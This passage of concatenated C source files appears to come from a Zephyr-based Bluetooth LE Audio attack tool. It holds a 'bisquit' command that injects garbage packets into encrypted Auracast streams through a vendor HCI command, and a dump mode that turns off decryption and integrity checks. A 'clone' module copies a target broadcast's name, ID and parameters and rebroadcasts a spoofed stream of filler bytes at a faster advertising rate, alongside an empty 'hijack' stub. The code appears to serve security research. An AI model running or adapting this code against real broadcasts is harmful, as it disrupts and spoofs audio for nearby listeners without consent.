        shell_error(sh, "Broadcast index %d out of bounds. Please specify something between 0 and %d. Check current broadcasts with `broadcast list`.", broadcast_idx, cur_bcast);
        return 1;
    }

    /* check if the user supplied a broadcast code */
    if (argc == 3) {
       broadcast_code = argv[2];
       shell_print(sh, "User supplied Broadcast Code %s. Decryption and MIC checks will be enabled, make sure the code is correct.", broadcast_code);
    }

    b = get_broadcast_at_idx(broadcast_idx);
    if (b) {
        bt_hci_iso_raw_dump_cb_register(iso_raw_dump_cb);
        pa_sync_create(b);

        err = k_sem_take(&sem_biginfo, SEM_TIMEOUT);
        if (err) {
            shell_error(sh, "Error: Timeout in getting BIGInfo for stream %s(0x%x)", b->broadcaster_name, b->broadcast_id);
        }

        if (b->has_biginfo) {
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            struct bt_iso_big_sync_param big_sync_param = {
                .bis_channels = bis,
                .num_bis = biginfo->num_bis,
                .bis_bitfield = (BIT_MASK(biginfo->num_bis)),
                .mse = BT_ISO_SYNC_MSE_ANY, /* any number of subevents */
                .sync_timeout = 100, /* in 10 ms units */
                .encryption = biginfo->encryption,
            };

            if (broadcast_code != NULL) {
                strncpy(broadcast_code, big_sync_param.bcode, 16);
            }

            /* if the stream is encrypted and we don't have a broadcast code supplied we disable MIC checks and decryption */
            if (biginfo->encryption && broadcast_code == NULL) {
                shell_print(sh, "Broadcast is encrypted, sending encryption disable HCI command.");
                err = bt_hci_cmd_send_sync(0x0666, NULL, NULL);
                if (err) {
                    shell_error(sh, "Error sending 0x0666 HCI command: %d", err);
                    return 1;
                }
            }

            err = bt_iso_big_sync(b->broadcast_sync, &big_sync_param, &big);
            if (err) {
                shell_error(sh, "Error establishing BIG sync: %d", err);
                return 1;
            }

            set_active_broadcast_prompt(b);
            shell_info(sh, "Starting to dump ISO packets. Stop with `broadcast dump stop`!");
        } else {
            shell_error(sh, "Error: broadcast 0x%x does not have BIGInfo yet, run scan biginfo first!", b->broadcast_id);
        }
    }
    return 0;
}

int broadcast_bisquit(const struct shell *sh, size_t argc, char **argv) {

    int err;
    struct broadcast *b;
    uint8_t broadcast_idx;

    if (argc < 2) {
        shell_error(sh, "Error: Missing broadcast ID parameter for bisquit.");
        return 1;
    }

    if (strcmp(argv[1], "stop") == 0) {
        b = get_active_broadcast();
        if(b) {
            err = bt_iso_big_terminate(big);
            if (err) {
                shell_error(sh, "Error terminating BIG: %d", err);
                return 1;
            }
            err = bt_le_per_adv_sync_delete(b->broadcast_sync);
            if (err) {
                shell_error(sh, "Error terminating periodic advertisment sync: %d", err);
                return 1;
            }
            // unregister raw iso callback
            bt_hci_iso_raw_dump_cb_register(NULL);
            remove_active_broadcast_prompt();
            return 0;
        } else {
            shell_error(sh, "No active broadcast to stop");
            return 1;
        }
    }

    broadcast_idx = strtol(argv[1], NULL, 10);
    if (broadcast_idx < 0 || broadcast_idx > cur_bcast) {
        shell_error(sh, "Broadcast index %d out of bounds. Please specify something between 0 and %d. Check current broadcasts with `broadcast list`.", broadcast_idx, cur_bcast);
        return 1;
    }

    b = get_broadcast_at_idx(broadcast_idx);

    if (b) {
        //bt_hci_iso_raw_dump_cb_register(iso_raw_dump_cb);
        pa_sync_create(b);

        err = k_sem_take(&sem_biginfo, SEM_TIMEOUT);
        if (err) {
            shell_error(sh, "Error: Timeout in getting BIGInfo for stream %s(0x%x)", b->broadcaster_name, b->broadcast_id);
        }
        if (b->has_biginfo) {
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            struct bt_iso_big_sync_param big_sync_param = {
                .bis_channels = bis,
                .num_bis = biginfo->num_bis,
                .bis_bitfield = (BIT_MASK(biginfo->num_bis)),
                .mse = BT_ISO_SYNC_MSE_ANY, /* any number of subevents */
                .sync_timeout = 100, /* in 10 ms units */
                .encryption = biginfo->encryption,
                .bcode = "", /* for bisquit this can be set to anything */
            };

            // if the stream is encrypted we disable MIC checks and decryption
            if (biginfo->encryption) {
                err = bt_hci_cmd_send_sync(0x0667, NULL, NULL);
                if (err) {
                    shell_error(sh, "Error sending 0x06667 HCI command: %d", err);
                    return 1;
                }
                shell_info(sh, "Encrypted BISQUIT mode: sending garbage BIS PDUs.");
                set_active_broadcast_prompt(b);
                shell_info(sh, "Starting BISQUIT-MIC. Stop with `broadcast bisquit stop`!");
            } else {
                shell_info(sh, "Unencrypted BISQUIT mode: sending Terminate Control PDU.");
                shell_error(sh, "Unfortunately, this is not implemented yet :(");
                return 1;
            }

            err = bt_iso_big_sync(b->broadcast_sync, &big_sync_param, &big);
            if (err) {
                shell_error(sh, "Error establishing BIG sync: %d", err);
                return 1;
            }

            set_active_broadcast_prompt(b);
        } else {
            shell_error(sh, "Error: broadcast 0x%x does not have BIGInfo yet, run scan biginfo first!", b->broadcast_id);
        }
    }

    return 0;
}

int broadcast_hijack(const struct shell *sh, size_t argc, char **argv) {
    return 0;
}
```

## src/clone.c
```c
/*
 *  WIP
 */

#include "clone.h"
#include "big_sync.h"

#include "sniff/bis_sink.h"

#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/net_buf.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/gap.h>
#include <zephyr/bluetooth/iso.h>
#include <zephyr/bluetooth/hci_types.h>
#include <zephyr/sys/byteorder.h>
#include <zephyr/sys/util.h>
#include <zephyr/logging/log.h>

LOG_MODULE_REGISTER(clone, LOG_LEVEL_INF);

#define AHT_CLONE_MAX_BIS 4U /* matches typical CONFIG_BT_ISO_MAX_CHAN */

BUILD_ASSERT(CONFIG_BT_ISO_MAX_CHAN >= AHT_CLONE_MAX_BIS,
	     "clone assumes at least AHT_CLONE_MAX_BIS ISO channels available");

static struct bt_le_ext_adv *adv;
static struct bt_iso_big    *big;
static bool                  active;

static struct bt_iso_chan_io_qos iso_tx_qos[AHT_CLONE_MAX_BIS];
static struct bt_iso_chan_qos    iso_qos[AHT_CLONE_MAX_BIS];
static struct bt_iso_chan        iso_chans[AHT_CLONE_MAX_BIS];
static struct bt_iso_chan       *iso_chan_ptrs[AHT_CLONE_MAX_BIS];
static uint8_t                   iso_num_bis;

static K_SEM_DEFINE(sem_big_up, 0, AHT_CLONE_MAX_BIS);

static uint16_t seq_num[AHT_CLONE_MAX_BIS];

#define AHT_CLONE_MAX_SDU_LEN 251U
static uint8_t  sdu_fill[AHT_CLONE_MAX_SDU_LEN];
static uint16_t sdu_len;

static uint32_t sdu_interval_us;

NET_BUF_POOL_FIXED_DEFINE(clone_tx_pool, AHT_CLONE_MAX_BIS,
			  BT_ISO_SDU_BUF_SIZE(AHT_CLONE_MAX_SDU_LEN),
			  CONFIG_BT_CONN_TX_USER_DATA_SIZE, NULL);

static void iso_connected(struct bt_iso_chan *chan)
{
	const struct bt_iso_chan_path hci_path = {
		.pid    = BT_ISO_DATA_PATH_HCI,
		.format = BT_HCI_CODING_FORMAT_TRANSPARENT,
	};
	ptrdiff_t idx = chan - &iso_chans[0];
	int err;

	if (idx < 0 || idx >= AHT_CLONE_MAX_BIS) {
		return;
	}

	err = bt_iso_setup_data_path(chan, BT_HCI_DATAPATH_DIR_HOST_TO_CTLR,
				     &hci_path);
	if (err) {
		LOG_ERR("clone: BIS %ld data-path setup failed: %d",
			(long)(idx + 1), err);
	}

	LOG_INF("clone: BIS %ld connected", (long)(idx + 1));
	seq_num[idx] = 0U;
	k_sem_give(&sem_big_up);
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason)
{
	ptrdiff_t idx = chan - &iso_chans[0];

	LOG_INF("clone: BIS %ld disconnected (reason 0x%02x)",
		(long)(idx + 1), reason);
}

static void iso_sent(struct bt_iso_chan *chan)
{
	ARG_UNUSED(chan);
}

static struct bt_iso_chan_ops iso_ops = {
	.connected    = iso_connected,
	.disconnected = iso_disconnected,
	.sent         = iso_sent,
};


static void clone_tx_work_handler(struct k_work *work);
static K_WORK_DELAYABLE_DEFINE(clone_tx_work, clone_tx_work_handler);

static int64_t next_target_us;

static void clone_reschedule_next(void)
{
	int64_t now_us = k_uptime_get() * 1000LL;
	int64_t delay_us;

	next_target_us += sdu_interval_us;
	delay_us = next_target_us - now_us;
	if (delay_us < 0) {
		next_target_us = now_us + sdu_interval_us;
		delay_us = sdu_interval_us;
	}
	(void)k_work_reschedule(&clone_tx_work, K_USEC(delay_us));
}

static void clone_tx_work_handler(struct k_work *work)
{
	ARG_UNUSED(work);

	if (!active) {
		return;
	}

	for (uint8_t i = 0U; i < iso_num_bis; i++) {
		struct net_buf *buf;
		int err;

		buf = net_buf_alloc(&clone_tx_pool, K_NO_WAIT);
		if (buf == NULL) {
			/* Pool exhausted, LL is behind on TX_DONE. Skip
			 * this SDU on this BIS rather than block the
			 * whole workqueue. */
			continue;
		}
		net_buf_reserve(buf, BT_ISO_CHAN_SEND_RESERVE);
		net_buf_add_mem(buf, sdu_fill, sdu_len);

		err = bt_iso_chan_send(&iso_chans[i], buf, seq_num[i]);
		if (err < 0) {
			LOG_WRN("clone: bt_iso_chan_send BIS %u seq %u: %d",
				(unsigned)(i + 1U), seq_num[i], err);
			net_buf_unref(buf);
			continue;
		}
		seq_num[i]++;
	}

	clone_reschedule_next();
}

int clone_init(void)
{
	for (uint8_t i = 0U; i < AHT_CLONE_MAX_BIS; i++) {
		iso_qos[i].tx        = &iso_tx_qos[i];
		iso_chans[i].ops     = &iso_ops;
		iso_chans[i].qos     = &iso_qos[i];
		iso_chan_ptrs[i]     = &iso_chans[i];
	}
	return 0;
}

#define CLONE_TRACE(sh, ...)                              \
	do {                                              \
		if ((sh) != NULL) {                       \
			shell_print((sh), __VA_ARGS__);   \
		} else {                                  \
			LOG_INF(__VA_ARGS__);             \
		}                                         \
	} while (0)

static uint8_t pa_payload_buf[BIG_SYNC_PA_PAYLOAD_MAX];
static size_t  pa_payload_buf_len;

#define CLONE_MAX_PA_AD_ENTRIES 8
static struct bt_data pa_ad_entries[CLONE_MAX_PA_AD_ENTRIES];
static size_t         pa_ad_entries_count;

static bool pa_ad_parser(struct bt_data *data, void *user_data)
{
	ARG_UNUSED(user_data);

	if (pa_ad_entries_count >= CLONE_MAX_PA_AD_ENTRIES) {
		return false;
	}
	pa_ad_entries[pa_ad_entries_count++] = *data;
	return true;
}

int clone_start(const struct sniffer_candidate *cand, const struct shell *sh)
{
	struct bt_iso_biginfo bi = {0};
	int err;

	if (active) {
		CLONE_TRACE(sh, "clone: already running, `clone stop` first");
		return -EBUSY;
	}

	if (sniffer_bis_sink_is_active()) {
		CLONE_TRACE(sh, "clone: EBUSY, `sniff stop` first");
		return -EBUSY;
	}
	if (big_sync_is_active()) {
		CLONE_TRACE(sh, "clone: EBUSY, `bison unsync` / `bisquit stop` first");
		return -EBUSY;
	}

	CLONE_TRACE(sh, "clone: fetching BIGInfo + PA payload from target");

	pa_payload_buf_len = 0U;
	err = big_sync_biginfo_only(cand, &bi,
				    pa_payload_buf, &pa_payload_buf_len, sh);
	if (err) {
		CLONE_TRACE(sh, "clone: BIGInfo fetch failed: %d", err);
		return err;
	}

	if (bi.num_bis == 0U || bi.num_bis > AHT_CLONE_MAX_BIS) {
		CLONE_TRACE(sh, "clone: unsupported num_bis=%u", bi.num_bis);
		return -EINVAL;
	}

	if (bi.max_sdu == 0U || bi.max_sdu > AHT_CLONE_MAX_SDU_LEN) {
		CLONE_TRACE(sh, "clone: unsupported max_sdu=%u", bi.max_sdu);
		return -EINVAL;
	}
	if (bi.encryption && cand->bcode_len == 0U) {
		CLONE_TRACE(sh, "clone: target is encrypted; set the "
				"broadcast_code via `scan bcode <target> <hex>` first");
		return -EACCES;
	}

	/* BIGInfo iso_interval is 1.25 ms. Candidate. We halve the PA interval
	 * so scanners see us at twice the rate ??
	 * Not sure if that works/make sense
	 */
	uint32_t src_pa_us = cand->pa_interval_us ? cand->pa_interval_us : 100000U;
	// uint32_t our_pa_us = src_pa_us / 2U;
	uint32_t our_pa_ms = src_pa_us / 1000U;

	if (our_pa_ms < 10U) {
		our_pa_ms = 10U;
	}

	uint16_t ext_adv_ms = (our_pa_ms > 20U) ? (our_pa_ms - 10U) : our_pa_ms;

	CLONE_TRACE(sh, "clone: BIGInfo num_bis=%u iso_int=%u bn=%u irc=%u "
			"pto=%u max_pdu=%u max_sdu=%u sdu_int_us=%u phy=%u "
			"framing=%u enc=%u",
		    bi.num_bis, bi.iso_interval, bi.burst_number, bi.rep_count,
		    bi.offset, bi.max_pdu, bi.max_sdu, bi.sdu_interval,
		    bi.phy, bi.framing, bi.encryption);
	CLONE_TRACE(sh, "clone: our_pa_ms=%u ext_adv_ms=%u",
		    our_pa_ms, ext_adv_ms);

	const struct bt_le_adv_param *ext_adv_param = BT_LE_ADV_PARAM(
		BT_LE_ADV_OPT_EXT_ADV,
		BT_GAP_MS_TO_ADV_INTERVAL(ext_adv_ms),
		BT_GAP_MS_TO_ADV_INTERVAL(ext_adv_ms), NULL);

	err = bt_le_ext_adv_create(ext_adv_param, NULL, &adv);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_le_ext_adv_create: %d", err);
		return err;
	}

	static uint8_t baa_data[2 + 3];
	uint32_t bid = cand->has_broadcast_id ? cand->broadcast_id : 0x000000U;

	sys_put_le16(0x1852U, baa_data);
	sys_put_le24(bid, baa_data + 2);

	size_t name_len = strnlen(cand->name, SNIFFER_CAND_NAME_MAX - 1);
	struct bt_data ext_ad[2] = {
		{
			.type = BT_DATA_SVC_DATA16,
			.data_len = sizeof(baa_data),
			.data = baa_data,
		},
		{
			.type = BT_DATA_BROADCAST_NAME,
			.data_len = (uint8_t)name_len,
			.data = (const uint8_t *)cand->name,
		},
	};
	size_t ext_ad_count = (name_len > 0U) ? 2U : 1U;

	err = bt_le_ext_adv_set_data(adv, ext_ad, ext_ad_count, NULL, 0);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_le_ext_adv_set_data: %d", err);
		goto fail_delete_adv;
	}

	struct bt_le_per_adv_param per_adv_param = {
		.interval_min = BT_GAP_MS_TO_PER_ADV_INTERVAL(our_pa_ms),
		.interval_max = BT_GAP_MS_TO_PER_ADV_INTERVAL(our_pa_ms),
		.options      = BT_LE_PER_ADV_OPT_NONE,
	};

	err = bt_le_per_adv_set_param(adv, &per_adv_param);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_le_per_adv_set_param: %d", err);
		goto fail_delete_adv;
	}

	pa_ad_entries_count = 0U;
	if (pa_payload_buf_len > 0U) {
		struct net_buf_simple pa_buf;

		net_buf_simple_init_with_data(&pa_buf, pa_payload_buf,
					      pa_payload_buf_len);
		bt_data_parse(&pa_buf, pa_ad_parser, NULL);

		if (pa_ad_entries_count > 0U) {
			err = bt_le_per_adv_set_data(adv, pa_ad_entries,
						     pa_ad_entries_count);
			if (err) {
				CLONE_TRACE(sh, "clone: bt_le_per_adv_set_data: %d "
						"(source PA has %u entries, %u bytes)",
					    err,
					    (unsigned)pa_ad_entries_count,
					    (unsigned)pa_payload_buf_len);
				goto fail_delete_adv;
			}
			CLONE_TRACE(sh, "clone: replicated source PA payload "
					"(%u entries, %u bytes)",
				    (unsigned)pa_ad_entries_count,
				    (unsigned)pa_payload_buf_len);
		}
	} else {
		CLONE_TRACE(sh, "clone: source has no PA payload. clone "
				"broadcasts BIGInfo-only PA (some receivers may not discover)");
	}

	err = bt_le_per_adv_start(adv);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_le_per_adv_start: %d", err);
		goto fail_delete_adv;
	}

	err = bt_le_ext_adv_start(adv, BT_LE_EXT_ADV_START_DEFAULT);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_le_ext_adv_start: %d", err);
		goto fail_stop_per_adv;
	}

	for (uint8_t i = 0U; i < bi.num_bis; i++) {
		iso_tx_qos[i].sdu          = bi.max_sdu;
		iso_tx_qos[i].phy          = bi.phy;
		iso_tx_qos[i].rtn          = 0U;
		iso_tx_qos[i].max_pdu      = bi.max_pdu;
		iso_tx_qos[i].burst_number = bi.burst_number;
		iso_qos[i].num_subevents   = bi.sub_evt_count;
	}
	iso_num_bis = bi.num_bis;

	struct bt_iso_big_create_param big_param = {
		.bis_channels  = iso_chan_ptrs,
		.num_bis       = bi.num_bis,
		.interval      = bi.sdu_interval,
		.latency       = 0U,
		.packing       = BT_ISO_PACKING_INTERLEAVED,
		.framing       = bi.framing,
		.encryption    = bi.encryption,
		.iso_interval  = bi.iso_interval,
		.irc           = bi.rep_count,
		.pto           = bi.offset,
	};

	if (bi.encryption) {
		size_t copy = MIN((size_t)cand->bcode_len,
				  sizeof(big_param.bcode));

		memcpy(big_param.bcode, cand->bcode, copy);
	}

	k_sem_reset(&sem_big_up);

	err = bt_iso_big_create(adv, &big_param, &big);
	if (err) {
		CLONE_TRACE(sh, "clone: bt_iso_big_create: %d", err);
		goto fail_stop_ext_adv;
	}

	CLONE_TRACE(sh, "clone: waiting for BIG BIS(es) to come up");

	for (uint8_t i = 0U; i < bi.num_bis; i++) {
		err = k_sem_take(&sem_big_up, K_SECONDS(5));
		if (err) {
			CLONE_TRACE(sh, "clone: BIS %u didn't come up",
				    (unsigned)(i + 1U));
			bt_iso_big_terminate(big);
			big = NULL;
			goto fail_stop_ext_adv;
		}
	}


	sdu_len = bi.max_sdu;
	sdu_interval_us = bi.sdu_interval ? bi.sdu_interval : 10000U;
	memset(sdu_fill, 0x41, sizeof(sdu_fill));

	active = true;
	next_target_us = k_uptime_get() * 1000LL;
	(void)k_work_reschedule(&clone_tx_work, K_NO_WAIT);

	CLONE_TRACE(sh, "clone: broadcasting num_bis=%u sdu_len=%u "
			"sdu_int_us=%u pa_ms=%u",
		    iso_num_bis, sdu_len, sdu_interval_us, our_pa_ms);
	return 0;

fail_stop_ext_adv:
	(void)bt_le_ext_adv_stop(adv);
fail_stop_per_adv:
	(void)bt_le_per_adv_stop(adv);
fail_delete_adv:
	(void)bt_le_ext_adv_delete(adv);
	adv = NULL;
	return err;
}

int clone_stop(void)
{
	active = false;
	(void)k_work_cancel_delayable(&clone_tx_work);

	if (big != NULL) {
		(void)bt_iso_big_terminate(big);
		big = NULL;
	}
	if (adv != NULL) {
		(void)bt_le_ext_adv_stop(adv);
		(void)bt_le_per_adv_stop(adv);
		(void)bt_le_ext_adv_delete(adv);
		adv = NULL;
	}
	return 0;
}

bool clone_is_active(void)
{
	return active;
}

void clone_status(char *out, size_t out_sz)
{
	snprintk(out, out_sz,
		 "adv=%s big=%s num_bis=%u sdu_len=%u sdu_int_us=%u",
		 adv != NULL ? "yes" : "no",
		 big != NULL ? "yes" : "no",
		 iso_num_bis, sdu_len, sdu_interval_us);
}
```

## src/clone.h
```c
/*
 * WIP
 */

#ifndef AHT_CLONE_H_
#define AHT_CLONE_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#include <zephyr/shell/shell.h>

#include "scan.h"

int  clone_init(void);

int  clone_start(const struct sniffer_candidate *cand,
		 const struct shell *sh);

int  clone_stop(void);
bool clone_is_active(void);

void clone_status(char *out, size_t out_sz);

#endif /* AHT_CLONE_H_ */
```

## src/clone_cli.c
```c
#include "clone.h"
#include "scan.h"

#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/shell/shell.h>
#include <zephyr/bluetooth/addr.h>


static int cmd_clone_start(const struct shell *sh, size_t argc, char **argv)
{
	struct sniffer_candidate cand;
	const char *tok = (argc >= 2) ? argv[1] : NULL;
	int err;

	err = sniffer_scan_lookup(tok, &cand);
	if (err) {
		if (tok == NULL) {
			shell_error(sh, "no broadcast candidates, `scan on` first");
		} else {
			shell_error(sh, "no matching candidate for '%s', "
					"`scan list` to see options", tok);
		}
		return err;
	}

	char addr_str[BT_ADDR_LE_STR_LEN];

	bt_addr_le_to_str(&cand.addr, addr_str, sizeof(addr_str));
	shell_print(sh, "clone: source %s sid=%u name='%s' bid=%s bcode=%s",
		    addr_str, cand.sid, cand.name,
		    cand.has_broadcast_id ? "set" : "-",
		    cand.bcode_len ? "set" : "-");

	err = clone_start(&cand, sh);
	if (err) {
		shell_error(sh, "clone start failed: %d", err);
		return err;
	}
	shell_print(sh, "clone: running, `clone stop` to tear down");
	return 0;
}

static int cmd_clone_stop(const struct shell *sh, size_t argc, char **argv)
{
	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	if (!clone_is_active()) {
		shell_warn(sh, "clone not running");
		return 0;
	}
	(void)clone_stop();
	shell_print(sh, "clone stopped");
	return 0;
}

static int cmd_clone_status(const struct shell *sh, size_t argc, char **argv)
{
	char line[128];

	ARG_UNUSED(argc);
	ARG_UNUSED(argv);

	clone_status(line, sizeof(line));
	shell_print(sh, "%s", line);
	return 0;
}

SHELL_STATIC_SUBCMD_SET_CREATE(sub_clone,
	SHELL_CMD_ARG(start, NULL,
		      "[<target>]: rebroadcast target's Auracast as a "
		      "0x41-fill BIG at 2x PA rate",
		      cmd_clone_start, 1, 1),
	SHELL_CMD(stop,   NULL, "Tear down clone",   cmd_clone_stop),
	SHELL_CMD(status, NULL, "Show clone state",  cmd_clone_status),
	SHELL_SUBCMD_SET_END
);

SHELL_CMD_REGISTER(clone, &sub_clone,
		   "clone: [WIP] Clone an Auracast stream (with bogus data)",
		   NULL);
```

## src/scan.h
```c
/*
 * Extended/periodic-advertising scan + BIS candidate discovery.
 *
 * The scan module observes ext-adv PDUs that announce a periodic
 * advertising interval.
 */

#ifndef SCAN_H_
#define SCAN_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#include <zephyr/bluetooth/bluetooth.h>

#define SNIFFER_CAND_NAME_MAX  32
#define SNIFFER_CAND_BCODE_MAX 16

struct sniffer_candidate {
	bool         valid;
	bt_addr_le_t addr;
	uint8_t      sid;
	int8_t       rssi;
	uint32_t     pa_interval_us;
	char         name[SNIFFER_CAND_NAME_MAX];
	uint8_t      bcode[SNIFFER_CAND_BCODE_MAX];
	uint8_t      bcode_len;
	uint32_t     broadcast_id;
	bool         has_broadcast_id;
};

int  sniffer_scan_init(void);
int  sniffer_scan_start(void);
int  sniffer_scan_stop(void);
bool sniffer_scan_is_active(void);

size_t sniffer_scan_get_candidates(struct sniffer_candidate *out, size_t max);
void   sniffer_scan_clear_candidates(void);

/*
 * Look up a candidate:
 *   NULL   -> first valid candidate in the list
 *   "N"    -> N-th valid candidate (`scan list` index)
 *   "AA:BB:CC:DD:EE:FF"    -> match by address
 *   any other string       -> substring match against the name
 *
 * Returns 0 on hit, -ENOENT on miss.
 */
int sniffer_scan_lookup(const char *tok, struct sniffer_candidate *out);

/*
 * Set / clear the bcode on the candidate identified by `tok` (same
 * lookup rules as sniffer_scan_lookup). bcode_len==0 clears. Returns
 * 0 on success, -ENOENT if no matching candidate, -EMSGSIZE if the
 * bcode is longer than SNIFFER_CAND_BCODE_MAX.
 */
int sniffer_scan_set_bcode(const char *tok, const uint8_t *bcode,
			   size_t bcode_len);

/*
 * Parse a hex string like "aa:bb:cc" or "aabbcc" into `out`. Colons,
 * dashes, and spaces are treated as separators. On success, *out_len
 * has the number of decoded bytes. Returns -EINVAL on bad hex,
 * -EMSGSIZE if the decoded byte count would exceed out_max.
 *
 */
int sniffer_scan_parse_hex(const char *s, uint8_t *out, size_t out_max,
			   size_t *out_len);

struct shell;
int sniffer_scan_bcode_cmd(const struct shell *sh, size_t argc, char **argv);

#endif /* SCAN_H_ */
```
